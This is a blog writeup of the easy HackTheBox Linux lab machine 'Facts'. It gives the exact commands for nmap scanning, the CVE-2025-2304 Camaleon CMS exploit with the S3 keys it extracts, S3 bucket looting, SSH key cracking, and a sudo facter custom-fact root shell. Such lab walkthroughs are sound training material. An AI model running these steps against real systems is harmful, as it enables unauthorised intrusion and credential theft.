---
layout: post
title: HackTheBox - Facts
authors: Samarth
date: 2026-03-23 09:30:00 +0530
categories: [HackTheBox, Machines]
tags: [Linux, Camaleon CMS, CVE-2025-2304, MinIO, S3, facter]
math: true
mermaid: true
protected: true
post_id: hackthebox-facts
---

![Facts - HTB](/assets/images/writeups/Facts-HTB/banner.png)

## TL;DR

This writeup is based on the [__Facts__](https://app.hackthebox.com/machines/Facts){:target="_blank"} machine, which is an easy-rated Linux box on Hack The Box. I began by scanning the target and found three open ports — SSH, HTTP, and an unusual port running **MinIO**, an S3-compatible object storage service. After enumerating the web server, I discovered it was running **Camaleon CMS v2.9.0**, which is vulnerable to **CVE-2025-2304**, an authenticated privilege escalation via mass assignment in the `updated_ajax` method. After creating a user account, I used the public exploit to escalate my role to admin and extract **AWS S3 credentials** from the admin settings page. Using these credentials with the **AWS CLI**, I enumerated the MinIO S3 bucket and discovered an `internal` bucket containing an `.ssh` directory. I downloaded the SSH private key, used `ssh2john` to identify the passphrase, and the key's comment revealed the username `trivia`. I logged in as `trivia` via SSH and captured the user flag. During privilege escalation, `sudo -l` revealed that the user could run `/usr/bin/facter` with elevated privileges. I created a malicious Ruby script and used the `--custom-dir` flag to load it via the privileged `facter` process, spawning a root shell and capturing the root flag.

## Scanning Network

I began by performing an Nmap scan, which revealed open ports 22, 80, and 54321, corresponding to `SSH`, `nginx`, and `MinIO` object storage. Here are the results from the Nmap scan:

```bash
nmap -sC -sV -p- -T4 -vv -oN full_port.scan 10.129.244.96

# Nmap 7.94SVN scan initiated Mon Mar 23 04:34:18 2026
Nmap scan report for 10.129.244.96
Host is up, received reset ttl 63 (0.18s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
|_  256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)
80/tcp    open  http    syn-ack ttl 63 nginx 1.26.3 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://facts.htb/
|_http-server-header: nginx/1.26.3 (Ubuntu)
54321/tcp open  unknown syn-ack ttl 62
|   GetRequest:
|     HTTP/1.0 400 Bad Request
|     Server: MinIO
|     X-Amz-Request-Id: 189F6EC7D51F065D
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Three services were detected — SSH, HTTP, and an interesting service on port `54321` identified as **MinIO**. Let's proceed with enumerating the HTTP service first.

## Enumeration

The Nmap scan revealed that the IP address is linked to the domain name `facts.htb`. Therefore, we need to add this domain to the `"/etc/hosts"` file.

Then, I visited `http://facts.htb/`.

![Browser View](/assets/images/writeups/Facts-HTB/1.png)


I created an account using `hack`:`admin` credentials and after logging in, it gave me access to the Admin Panel.

![Admin Panel](/assets/images/writeups/Facts-HTB/3.png)

The Admin Panel revealed that the application is running **Camaleon CMS** version `v2.9.0`.

`Camaleon CMS` is an open-source, database-driven content management system built on Ruby on Rails. It is designed to be flexible and extendable, allowing developers to build custom web applications on top of it.

`Camaleon CMS v2.9.0` is vulnerable to [__CVE-2025-2304__](https://nvd.nist.gov/vuln/detail/CVE-2025-2304){:target="_blank"}.

## Exploitation

`CVE-2025-2304` is an authenticated privilege escalation vulnerability in Camaleon CMS. When a user wishes to change their password, the `updated_ajax` method of the `UsersController` is called. The vulnerability stems from the use of the dangerous `permit!` method, which allows all parameters to pass through without any filtering, enabling a mass assignment attack to escalate the user's role to admin.

Exploit Reference: [https://github.com/Alien0ne/CVE-2025-2304](https://github.com/Alien0ne/CVE-2025-2304){:target="_blank"}

Let's use the exploit to escalate our privileges. The exploit requires the target URL, a valid username, and password.

__1.__ `First` — Run the exploit to escalate role to admin

```bash
python3 exploit.py -u http://facts.htb/ -U <username> -P <password> --newpass <new-password>
```

![Privilege Escalation](/assets/images/writeups/Facts-HTB/4.png)

__2.__ `Second` — Run the exploit with the `-e` flag to additionally extract the AWS S3 credentials from the admin settings page

```bash
python3 exploit.py -u http://facts.htb/ -U <username> -P <password> --newpass <new-password> -e
```

![S3 Credentials Extracted](/assets/images/writeups/Facts-HTB/5.png)

```bash
python3 exploit.py -u http://facts.htb -U sam -P hack --newpass hack -e

[+] Camaleon CMS Version 2.9.0 PRIVILEGE ESCALATION (Authenticated)
[+] Login confirmed
   User ID: 7
   Current User Role: admin
[+] Loading PRIVILEGE ESCALATION
   User ID: 7
   Updated User Role: admin
[+] Extracting S3 Credentials
   s3 access key: AKIAA616B19DC49C19F9
   s3 secret key: V53NfwQUQuU4R1bi9RgqNfCFgNR63PGaok6AbFA6
   s3 endpoint: http://localhost:54321
[+] Reverting User Role
```

I successfully extracted the AWS S3 credentials. Let's log back into the admin panel as `sam` to verify.

![Admin Panel as sam](/assets/images/writeups/Facts-HTB/6.png)

Navigating to `Settings` > `General Site` > `Filesystem Settings` reveals everything about the AWS S3 configuration.

![Filesystem Settings](/assets/images/writeups/Facts-HTB/7.png)

I found the AWS access key, secret key, and the endpoint. Let's use the **AWS CLI** to enumerate the S3 bucket using these credentials.

Let's configure the AWS CLI with the access key, secret key, and region first.

![AWS CLI Configure](/assets/images/writeups/Facts-HTB/8.png)

Now let's identify the available buckets. 

You can use this [guide](https://www.intigriti.com/researchers/blog/hacking-tools/hacking-misconfigured-aws-s3-buckets-a-complete-guide) to understand AWS S3 enumeration.

```bash
aws s3 ls --endpoint-url http://facts.htb:54321/
```

![S3 Buckets](/assets/images/writeups/Facts-HTB/9.png)

The `internal` S3 bucket looks interesting. Let's explore it further.

![Internal Bucket Contents](/assets/images/writeups/Facts-HTB/10.png)

I found an `.ssh` directory inside the `internal` bucket, which may contain private keys. Let's download it to our local machine.

![Downloading SSH Key](/assets/images/writeups/Facts-HTB/11.png)

The SSH private key is passphrase-protected. Let's use `ssh2john` to extract the hash and crack the passphrase.

![ssh2john](/assets/images/writeups/Facts-HTB/12.png)

While examining the key, I noticed the key's comment is `trivia@facts.htb`, which reveals the username.

![Key Comment](/assets/images/writeups/Facts-HTB/13.png)

Let's use the `id_ed25519` key to log in as the `trivia` user.

```bash
ssh -i id_ed25519 trivia@facts.htb
```

![User Shell](/assets/images/writeups/Facts-HTB/14.png)

Success! I logged in as `trivia` and obtained the user flag.

![User Flag](/assets/images/writeups/Facts-HTB/15.png)

## Post Exploitation

Let's run `sudo -l` to check which commands the current user can run with elevated privileges.

![sudo -l](/assets/images/writeups/Facts-HTB/16.png)

I found that `trivia` can run `/usr/bin/facter` as root. `facter` is a Ruby wrapper script (part of Puppet) that collects system facts and processes CLI arguments. By itself it's not exploitable, but since it can be run with `sudo`, it becomes a privilege escalation vector.

The `--custom-dir` flag allows loading custom Ruby fact scripts from a specified directory. I can abuse this by creating a malicious Ruby script that spawns a bash shell.

Let's create the malicious Ruby script:

```bash
mkdir /tmp/exploit
cd /tmp/exploit
echo -e '#!/usr/bin/env ruby\nsystem("/bin/bash")' > shell.rb
```

Now let's execute `facter` with `sudo`, pointing it to our malicious directory:

```bash
sudo /usr/bin/facter --custom-dir=/tmp/exploit
```

![Root Shell](/assets/images/writeups/Facts-HTB/17.png)

![Pwned](/assets/images/writeups/Facts-HTB/Pwned.png)

Thanks for reading this far. If you enjoyed the writeup, do support me [__here__](https://www.buymeacoffee.com/h4xplo1t){:target="_blank"}.